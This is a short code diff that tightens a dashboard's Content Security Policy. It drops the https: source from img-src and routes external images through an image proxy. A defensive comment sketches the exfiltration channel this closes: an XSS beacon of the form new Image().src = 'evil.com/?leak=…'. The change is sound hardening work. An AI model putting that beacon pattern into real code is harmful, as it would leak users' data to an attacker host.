@@ -103,7 +103,14 @@ export const HTML_SECURITY_HEADERS: Record<string, string> = {
     "script-src 'self'",
     "style-src 'self' 'unsafe-inline'",
     "connect-src 'self' ws://127.0.0.1:* ws://localhost:* wss:",
-    "img-src 'self' data: https:",
+    // img-src tightened from 'self' data: https: → 'self' data:.
+    // Every external image now routes through /api/img-proxy (see
+    // src/lib/img-proxy.ts) so the response bytes arrive over the
+    // dashboard origin, satisfying 'self'. This closes the "future
+    // XSS exfiltrates via new Image().src = 'evil.com/?leak=…'"
+    // channel — without the proxy that load would succeed under the
+    // old `https:` token.
+    "img-src 'self' data:",
     "font-src 'self' data:",
     // Loopback only — used by the chat panel's live-preview iframe to
     // embed a project's local Vite dev server (default :5173) AND by the
